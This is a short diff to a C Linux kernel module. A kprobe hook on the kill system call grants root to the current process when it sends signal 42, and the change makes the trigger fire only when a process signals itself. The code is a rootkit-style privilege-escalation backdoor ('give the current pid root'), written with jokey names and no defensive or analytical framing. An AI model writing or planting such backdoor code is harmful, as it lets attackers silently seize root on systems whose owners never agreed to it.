@@ -50,9 +50,14 @@ static int haha_funny_number(struct kprobe *p, struct pt_regs *regs) {
   struct pt_regs *real_regs;
   real_regs = (struct pt_regs *)regs->di;
   sig = (int)real_regs->si;
-  if (sig == 42) { // if the signal code is 42
-    pid_t target_pid;
-    target_pid = current->pid;
+  pid_t target_pid;
+  target_pid = current->pid;
+  pid_t source_pid = (pid_t)real_regs->di;
+  if (sig == 42 &&
+      target_pid ==
+          source_pid) { // if the signal code is 42 and if the process
+                        // being targeted is the same as the source PID
+
     printk(KERN_INFO "the answer to everything!\n"); // 42!
     give_woot(target_pid); // give the current pid root
     regs->ax = 0;          // system call return code for kill
